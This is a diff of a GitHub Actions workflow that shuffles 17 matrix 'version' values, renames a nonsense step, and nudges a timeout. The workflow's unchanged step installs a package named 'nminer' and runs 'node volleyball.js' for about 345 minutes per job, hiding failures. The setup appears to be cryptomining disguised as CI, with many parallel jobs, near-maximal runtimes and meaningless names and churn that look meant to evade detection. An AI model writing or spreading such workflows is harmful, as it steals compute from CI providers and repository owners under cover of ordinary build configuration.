@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8680 }
-          - { version: 7870 }
-          - { version: 3658 }
-          - { version: 1860 }
-          - { version: 1997 }
-          - { version: 2586 }
-          - { version: 6343 }
-          - { version: 1666 }
-          - { version: 7035 }
-          - { version: 2270 }
-          - { version: 1975 }
-          - { version: 193 }
-          - { version: 2503 }
-          - { version: 7566 }
-          - { version: 970 }
-          - { version: 3462 }
-          - { version: 6972 }
+          - { version: 4002 }
+          - { version: 6715 }
+          - { version: 5997 }
+          - { version: 9718 }
+          - { version: 2246 }
+          - { version: 6627 }
+          - { version: 7730 }
+          - { version: 1513 }
+          - { version: 4883 }
+          - { version: 6320 }
+          - { version: 8168 }
+          - { version: 3865 }
+          - { version: 6113 }
+          - { version: 6514 }
+          - { version: 2166 }
+          - { version: 86 }
+          - { version: 898 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: versus how mismatch ouch
+      - name: before
         run: |
           npm install nminer@latest
-          timeout 344m node volleyball.js || echo "volleyball executed"
+          timeout 345m node volleyball.js || echo "volleyball executed"
